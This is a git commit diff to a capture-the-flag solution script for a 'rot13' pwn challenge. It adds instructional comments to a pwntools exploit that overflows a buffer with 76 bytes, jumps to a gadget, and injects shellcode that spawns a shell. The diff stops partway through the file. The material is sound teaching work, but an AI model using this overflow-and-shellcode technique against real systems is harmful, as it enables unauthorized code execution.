1bf2796e17541867bb4af7060240ce2b00c16b73
Aaron B. Gallagher <aaron.b.gallagher@gmail.com>
2019-10-27 21:28:05 -0700

    Add writeup, still need pictures

--- pwn/100-rot13/solution/solver.py
+++ pwn/100-rot13/solution/solver.py
@@ -1,34 +1,39 @@
 #!/usr/bin/env python2
 from pwn import *
+
+# You might have to change this depending on the architecture of the binary
 context.arch = 'i386'
+#context.arch = 'amd64'
 
-FNAME = '../distFiles/rot13'
-
-HOST = 'rot13.bsidespdxctf.party'
-PORT = '1337'
-
-DEBUG = False
+# Toggle these variables to turn debugging or remote exploitation on/off
 REMOTE = True
+DEBUG = False
 
-JMP_RSP_GADGET = 0x080484e3
+# Update these to match your environment
+FNAME = '../distFiles/rot13'
+HOST = '127.0.0.1'
+PORT = '1337'
 
 def getp():
     if REMOTE:
         p = remote(HOST, PORT)
     elif DEBUG:
-        p = process(['linux_server', '-p4200', FNAME])
+        p = process(['gdbserver', 'localhost:1234', FNAME])
     else:
         p = process([FNAME])
     return p
 
 p = getp()
-p.recvuntil('!\n')
 
 payload = ''
-payload += 'A'*64
-payload += 'B'*12
-payload += p32(JMP_RSP_GADGET)
+payload += 'A'*76
+# p32() is used to convert an integer to a binary string of the correct endianness for your binary
+# for x64 binaries, you are likely to use p64() instead.
+payload += p32(0x080484e3)
+# pwntools provides free shellcode for us!  This will execute a shell!
 payload += asm(shellcraft.i386.linux.sh())
+# And just to clean-up things, we will add some shellcode that cleanly calls exit.
+# This isn't required though.
 payload += asm(shellcraft.i386.linux.exit())
 
 # subtract 13 from each byte
